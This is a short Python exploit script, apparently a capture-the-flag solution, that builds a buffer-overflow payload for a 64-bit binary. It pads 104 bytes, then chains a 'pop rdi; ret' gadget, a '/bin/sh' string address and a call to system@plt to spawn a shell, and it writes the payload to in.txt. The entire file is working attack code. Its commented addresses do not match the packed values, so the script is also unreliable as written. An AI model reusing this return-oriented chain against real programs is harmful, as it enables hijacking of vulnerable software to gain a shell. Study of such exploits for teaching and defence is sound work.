#!/usr/bin/python
from struct import *

buf = ""
buf += "A"*104
buf += pack("<Q",0x4007a3)		# 0x0000000000400853: pop rdi; ret;
buf += pack("<Q",0x4007cf)      # 0x0040087f  /bin/sh
# 0x004008c2  /bin/sh

buf += pack("<Q",0x4004f0) # call   4004f0 <system@plt>


f = open("in.txt","w")
f.write(buf)
f.close()

